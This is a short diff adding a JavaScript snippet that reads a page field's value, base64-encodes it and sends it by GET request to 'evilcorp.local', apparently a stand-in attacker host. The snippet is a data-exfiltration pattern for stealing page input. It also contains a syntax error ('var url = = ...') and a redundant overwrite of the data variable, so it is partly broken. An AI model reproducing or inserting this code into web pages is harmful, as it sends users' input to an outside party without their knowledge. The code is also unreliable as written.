@@ -1,0 +1,14 @@
+var data = document.getElementById('id').value;
+
+var data = "1234"
+var encoded = btoa(data);
+new_encoded = encoded.replace('+', '-').replace('/', '_').replace(/=+$/, '%3D');
+
+console.log(new_encoded);
+
+var url = = "http://evilcorp.local/api/post/?id=" + new_encoded;
+
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", url, false );
+xmlHttp.send( null );
+xmlHttp.responseText;
